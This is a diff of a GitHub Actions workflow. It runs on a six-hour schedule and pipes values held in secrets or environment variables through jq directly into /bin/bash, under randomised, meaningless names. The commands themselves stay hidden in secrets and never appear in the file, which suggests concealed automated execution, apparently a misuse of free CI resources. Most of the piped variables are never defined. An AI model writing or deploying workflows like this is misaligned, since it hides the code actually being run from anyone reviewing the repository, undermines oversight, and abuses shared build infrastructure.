@@ -1,11 +1,9 @@
 name: dingruoyashh
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '28 1/6 * * *'
-
-jobs:  # 29029
+    - cron: '51 2/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
 
@@ -13,10 +11,13 @@ jobs:  # 29029
       - uses: actions/checkout@v4
       - name: dingruoyashh
         env:
-          wzr769: ${{ secrets.wzr769 }}
+          jazi75939: ${{ secrets.jazi75939 }}
         run: |
-          echo $wzr769 | jq -r .ukjzy267 | /bin/bash
-          echo $laiug31109 | jq -r .pksva174 | /bin/bash
-          echo $j84490 | jq -r .xfwvu79939 | /bin/bash
-          echo $rdfo62 | jq -r .xaq042 | /bin/bash
+          echo $jazi75939 | jq -r .nder28 | /bin/bash
+          echo $j66 | jq -r .v992 | /bin/bash
+          echo $koj10187 | jq -r .iqmzh4 | /bin/bash
+          echo $slxl0409 | jq -r .bbtpe182 | /bin/bash
+          echo $gwhyl86 | jq -r .jn8970 | /bin/bash
+          echo $fs1 | jq -r .avbd5768 | /bin/bash
+          echo $sfzs2 | jq -r .japol2 | /bin/bash
 
